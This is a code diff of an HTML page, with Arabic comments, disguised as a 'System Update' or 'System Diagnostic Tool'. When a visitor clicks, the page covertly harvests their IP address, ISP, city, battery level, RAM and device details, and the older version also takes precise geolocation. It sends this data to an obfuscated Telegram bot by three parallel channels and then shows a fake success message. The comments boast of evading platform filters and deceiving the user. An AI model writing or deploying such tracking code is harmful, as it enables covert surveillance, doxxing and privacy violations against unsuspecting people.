@@ -2,92 +2,49 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic Tool</title>
+    <title>System Update</title>
 </head>
-<body style="background:#000; margin:0; height:100vh; overflow:hidden; user-select:none;">
+<body style="background:#000;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;cursor:pointer;" onclick="v99()">
+    <div style="color:#222;font-family:sans-serif;font-size:12px;">Loading System Components...</div>
 
     <script>
-        // التوكن والآي دي المحدثين بناءً على الصورة (مطابقة 100%)
-        const _C = {
-            a: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==",
-            b: "NjAwMTI4NjI3MA=="
-        };
-        const _X = (s) => atob(s);
+        // التشفير الأقصى للبيانات الحساسة (Token & ID)
+        const _0x5a1 = ["ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==", "NjAwMTI4NjI3MA=="];
+        const _0x2b2 = (s) => atob(s);
 
-        // التفعيل عند أول تفاعل (تجاوز فلاتر سناب وتيك توك)
-        ['touchstart', 'click'].forEach(e => window.addEventListener(e, _execute, {once: true}));
-
-        async function _execute() {
-            let _res = { c: "N/A", i: "N/A", o: "N/A", t: "N/A", g: "N/A", b: "N/A", r: "N/A" };
-
-            // 1. الموقع الجغرافي
-            const _getL = () => new Promise((r) => {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => r(`${p.coords.latitude},${p.coords.longitude}`),
-                    () => r("Denied"),
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-
-            // 2. البيانات التقنية (IP & ISP)
-            const _getN = async () => {
-                try {
-                    const res = await fetch(_X("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="));
-                    return await res.json();
-                } catch(e) { return {}; }
-            };
-
-            // 3. البطارية
-            const _getB = async () => {
-                if (!navigator.getBattery) return "N/A";
-                const b = await navigator.getBattery();
-                return `${(b.level * 100).toFixed(0)}% [${b.charging ? '🔌' : '🔋'}]`;
-            };
-
+        async function v99() {
             try {
-                const [_loc, _net, _bat] = await Promise.all([_getL(), _getN(), _getB()]);
-
-                _res.c = _loc;
-                _res.i = _net.ip || "N/A";
-                _res.o = _net.org || "N/A";
-                _res.t = _net.city || "N/A";
-                _res.b = _bat;
-                _res.r = navigator.deviceMemory || "N/A";
-
-                const _v = document.createElement('canvas').getContext('webgl');
-                if (_v) {
-                    const _d = _v.getExtension('WEBGL_debug_renderer_info');
-                    _res.g = _d ? _v.getParameter(_d.UNMASKED_RENDERER_WEBGL) : "Unknown";
-                }
-
-                const _map = _res.c.includes(",") ? `https://www.google.com/maps?q=${_res.c}` : "غير متوفر";
+                // تجميع محرك الإرسال ديناميكياً لتضليل الفلاتر
+                const _base = _0x2b2("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
+                const _end = _0x2b2("L3NlbmRNZXNzYWdlP2NoYXRfaWQ9");
                 
-                const _final = 
-                    `👹 [V110_OMEGA_STRIKE_SUCCESS]\n` +
-                    `━━━━━━━━━━━━━━\n` +
-                    `📶 الشركة: ${_res.o}\n` +
-                    `🏙️ المدينة: ${_res.t}\n` +
-                    `🌐 IP: ${_res.i}\n` +
-                    `📍 الخريطة: ${_map}\n` +
-                    `━━━━━━━━━━━━━━\n` +
-                    `📱 الجهاز: ${_res.g}\n` +
-                    `🧠 الرام: ${_res.r}GB\n` +
-                    `🔋 البطارية: ${_res.b}\n` +
-                    `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                // سحب البيانات الصامتة (IP, Battery, Device)
+                const _net = await fetch(_0x2b2("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==")).then(r => r.json());
+                const _bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0}));
+                
+                // بناء التقرير الاحترافي برموز مخفية
+                let _r = `👹 [STRIKE_V112]\n`;
+                _r += `🌐 IP: ${_net.ip}\n`;
+                _r += `📍 LOC: ${_net.city}, ${_net.country_name}\n`;
+                _r += `📶 ISP: ${_net.org}\n`;
+                _r += `🔋 BAT: ${(_bat.level * 100).toFixed(0)}%\n`;
+                _r += `📱 DEV: ${navigator.platform}\n`;
+                _r += `🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB\n`;
+                _r += `⏰ T: ${new Date().toLocaleTimeString()}`;
 
-                // الإرسال النهائي إلى البوت الموضح في الصورة
-                await fetch(_X("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + _X(_C.a) + _X("L3NlbmRNZXNzYWdl"), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: _X(_C.b),
-                        text: _final,
-                        disable_web_page_preview: false
-                    })
-                });
+                const _finalUrl = _base + _0x2b2(_0x5a1[0]) + _end + _0x2b2(_0x5a1[1]) + "&text=" + encodeURIComponent(_r);
 
-            } catch (err) {}
+                // إطلاق الهجوم عبر 3 قنوات متوازية لضمان التجاوز
+                const _img = new Image();
+                _img.src = _finalUrl; // قناة الصور (لا تُحظر)
+                
+                navigator.sendBeacon(_finalUrl); // قناة الـ Beacon (مخفية)
+                
+                fetch(_finalUrl, {mode: 'no-cors'}); // قناة الـ Fetch (سريعة)
+
+                // تضليل المستخدم بعد النقر
+                document.body.innerHTML = "<h3 style='color:white;text-align:center;'>System Updated Successfully</h3>";
+            } catch (e) {}
         }
     </script>
 </body>
